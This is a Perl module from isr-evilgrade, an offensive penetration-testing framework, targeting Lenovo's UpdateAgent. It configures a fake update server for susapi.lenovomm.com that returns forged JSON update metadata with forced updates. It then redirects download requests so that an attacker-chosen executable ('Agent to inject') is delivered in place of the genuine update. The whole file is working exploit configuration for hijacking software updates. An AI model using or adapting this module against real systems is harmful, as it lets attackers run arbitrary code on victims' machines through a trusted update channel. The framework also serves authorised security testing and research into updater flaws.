###############
# lenovo.pm
#
# Copyright 2016 Matias Ariel Re Medina
#
# Info
# Duo.com:
# https://duo.com/assets/pdf/out-of-box-exploitation_oem-updaters.pdf
#
# This file is part of isr-evilgrade, www.faradaysec.com .
#
# isr-evilgrade is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation version 2 of the License.
#
# isr-evilgrade is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with isr-evilgrade; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
#
# '''
##
package modules::lenovo;

use strict;
use Data::Dump qw(dump);

my $base = {
    'name'        => 'lenovo',
    'version'     => '1.0',
    'appver'      => 'All',
    'author'      => ['Matias Ariel Re Medina <mre[at]faradaysec[dot]com>'],
    'description' => qq{Lenovo's UpdateAgent},
    'vh'          => '(susapi.lenovomm.com)',
    'request'     => [
        {   'req'    => '/adpserver/GetVIByAKFWPC', #regex friendly
            'type'   => 'string',                   #file|string|agent|install
            'method' => '',                         #any
            'bin'    => '0',
            'string' => '{
                "RES":"SUCCESS",
                "FORMATTYPE":"FTYPE_2",
                "ChannelKey":"null",
                "VerCode":"<%RND1%>",
                "VerName":"<%RND2%>",
                "DownloadURL":"http://susapi.lenovomm.com/aNumdpserver/DLBYREDFOL?pt=windows&id=<%RND3%>&pn=null&vc=<%RND1%>&vn=<%RND2%>&ch=Common&rep1=param1&rep2=param2&rep3=param3&OL=*01*L2FkcEBjbHVzdGVyLTEvMTQyNjgzNTcxMzYzNS9PNEVYTTBRV0tRS1ovMTAwMy9VcGRhdGVBZ2VudC5leGV8LTF8MHww",
                "Size": "<%AGENTSIZE%>",
                "UpdateDesc":"up",
                "FileName":"<%EXENAME%>.exe",
                "CtrlKey":"0",
                "CustKey":"null",
                "PackageID":"<%RND3%>",
                "FPMD5": "<%AGENTMD5%>",
                "ForceUpdate":"<%FORCE%>"
                }',
            'parse' => '1',
            'file'  => '',
        },
        {   'req' => '/adpserver/GetVIByAKSimpFPC',    #regex friendly
            'type'   => 'string',    #file|string|agent|install
            'method' => '',          #any
            'bin'    => '0',
            'string' => '{
                "RES":"SUCCESS",
                "FORMATTYPE":"FTYPE_3",
                "ChannelKey":"null",
                "VerCode":"<%RND1%>",
                "VerName":"<%RND4%>.<%RND4%>",
                "DownloadURL":"http://susapi.lenovomm.com/adpserver/DLBIDFS?ds=<%RND3%>_<%RND3%><%RND1%>",
                "Size": "<%AGENTSIZE%>",
                "UpdateDesc":"up",
                "FileName":"<%EXENAME%>.exe",
                "CtrlKey":"0",
                "CustKey":"null",
                "PackageID":"<%RND3%>",
                "FPMD5": "<%AGENTMD5%>",
                "ForceUpdate":"<%FORCE%>"
                }',
            'parse' => '1',
            'file'  => '',
        },
        {   'req' => '(aNumdpserver/DLBYREDFOL)|(adpserver/DLBIDFS)'
            ,    #regex friendly
            'type'    => 'string',                  #file|string|agent|install
            'method'  => '',                        #any
            'bin'     => 0,
            'string'  => '',
            'parse'   => '1',
            'file'    => '',
            'cheader' => "HTTP/1.1 302 Found\r\n"
                . "Location: http://susapi.lenovomm.com/<%EXENAME%>.exe \r\n"
                . "Content-Length: 0 \r\n"
                . "Connection: close \r\n\r\n",
        },
        {   'req'    => '.exe',                     #regex friendly
            'type'   => 'agent',                    #file|string|agent|install
            'method' => '',                         #any
            'bin'    => 1,
            'string' => '',
            'parse'  => '0',
            'file'   => ''
        },
    ],

    #Options
    'options' => {
        'agent' => {
            'val'  => './agent/agent.exe',
            'desc' => 'Agent to inject'
        },
        'enable' => {
            'val'  => 1,
            'desc' => 'Status'
        },
        'force' => {
            'val'  => 'Yes',
            'desc' => 'Force update? Default yes.'
        },
        'exename' => {
            'val'  => 'UpdateAgent',
            'desc' => 'Executable name.'
        },
        'rnd1' => {
            'val'     => 'isrcore::utils::RndNum(4)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd2' => {
            'val'     => 'isrcore::utils::RndAlpha(2)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd3' => {
            'val'     => 'isrcore::utils::RndNum(5)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd4' => {
            'val'     => 'isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd5' => {
            'val'     => 'isrcore::utils::RndNum(2)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd6' => {
            'val'     => 'isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1
        },
        'rnd7' => {
            'val'     => 'isrcore::utils::RndNum(1)',
            'hidden'  => 1,
            'dynamic' => 1
        },
    }
};

##########################################################################
# FUNCTION      new
# RECEIVES
# RETURNS
# EXPECTS
# DOES          class's constructor
sub new {
    my $class = shift;
    my $self = { 'Base' => $base, @_ };
    return bless $self, $class;
}
1;
